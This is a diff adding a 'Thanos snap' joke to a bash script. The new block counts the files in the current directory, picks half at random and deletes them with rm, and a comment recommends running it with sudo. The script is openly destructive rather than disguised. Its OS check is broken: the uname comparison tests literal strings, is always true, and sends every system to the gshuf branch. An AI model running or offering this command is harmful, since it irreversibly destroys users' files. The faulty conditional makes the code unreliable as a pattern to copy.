@@ -26,3 +26,14 @@ for ((i=0; i<${#arr[@]}; i++)); do
     echo "${arr[$i]}"
     echo "thanos initiating his snap, brance yourselves"
 done
+
+#different approach
+
+##count the number of files in the current directory and divide it by two
+let "i=`find . -type f | wc -l`/2";
+if [[ uname=="Darwin" ]]; then
+    find . -not -name "Thanos.sh" -type f -print0 | gshuf -z -n $i | xargs -0  -- rm;
+else
+    find . -not -name "Thanos.sh" -type f -print0 | shuf -z -n $i | xargs -0  -- rm;
+fi
+#its preferred if sudo is used.
